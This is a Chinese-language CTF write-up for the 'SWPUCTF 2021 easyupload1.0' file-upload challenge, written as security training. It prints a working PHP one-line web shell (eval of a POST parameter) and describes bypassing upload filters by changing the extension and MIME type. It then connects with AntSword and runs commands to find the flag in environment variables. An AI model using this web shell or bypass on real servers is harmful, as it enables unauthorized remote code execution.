## 基本信息

- 题目名称： [SWPUCTF 2021 新生赛]easyupload1.0
- 题目链接： https://www.nssctf.cn/problem/388
- 考点清单： 文件上传，文件头绕过，MIME绕过
- 工具清单： Yakit，蚁剑
- payloads： 一句话木马

## 一、看到什么

1. `选择文件`：可以选择需要上传的文件
2. `上传按钮`：可以上传文件

## 二、想到什么解题思路

1. 上传含有一句话的php文件，尝试获取flag
2. 使用jpg文件头伪装绕过，尝试上传php文件

## 三、尝试过程和结果记录

1. 创建一个包含木马的文件，内容为`<?php @eval($_POST['cmd']);?>`
    - `<?php ... ?>`：这是php代码的开始和结束标记。
    - `@eval(...)`：`eval` 是php中的一个函数，用于将字符串作为php代码执行。@ 符号用于抑制错误信息，避免在执行出错时显示错误。
    - `$_POST['cmd']`：`$_POST` 是一个超全局数组，用于获取通过HTTP POST方法传递的数据。`$_POST['cmd']` 表示从POST请求中获取名为 cmd 的参数值，也是连接木马的`密码`。

    直接上传php文件，提示`想啥呢`，显然是不允许上传php文件的

2. 将包含一句话木马的php文件更改为jpg后缀，上传jpg文件，显示上传成功和路径，这证明了文件头绕过是可行的，但是我们必须将后缀改成php才能使一句话木马可以解析生效

3. 在Yakit中找到刚刚上传的文件记录，右键发送到Web Fuzzer

    ![alt text](<images/[SWPUCTF 2021 新生赛]easyupload1.0-yakit.jpg>)

    在Web Fuzzer中，修改文件后缀，改回php，然后重放，得到文件路径

4. 在蚁剑中拼接url（将靶机的网址和文件存放的路径结合），输入一句话木马的密码，尝试访问，成功连接
    ![alt text](<images/[SWPUCTF 2021 新生赛]easyupload1.0-antsword-connect.jpg>)

    进入蚁剑提供的虚拟终端，输入命令`find / -name flag`，查找flag文件，找到flag文件路径

    ![alt text](<images/[SWPUCTF 2021 新生赛]easyupload1.0-find_flag.jpg>)

    这里获得了一个flag，但是是错误的flag，真正的flag被隐藏了

5. 继续查找flag，除了显而易见的`/app/flag`，flag还可能被藏在一些配置信息中，比如`phpinfo`或者环境变量里。在虚拟终端使用`env`，成功找到了flag
    ![alt text](<images/[SWPUCTF 2021 新生赛]easyupload1.0-env.jpg>)
## 四、总结与反思

- 要积累一些一句话木马绕过上传限制的方法，可以从简单的前端绕过开始，比如修改文件后缀，再到MIME绕过等，在一些本地化的靶场（如`uploadlabs`）中多练习，熟练掌握。
- 有时候题目会给出一些假的flag，不要被迷惑，要多查找、多思考、多尝试，不断的总结经验。
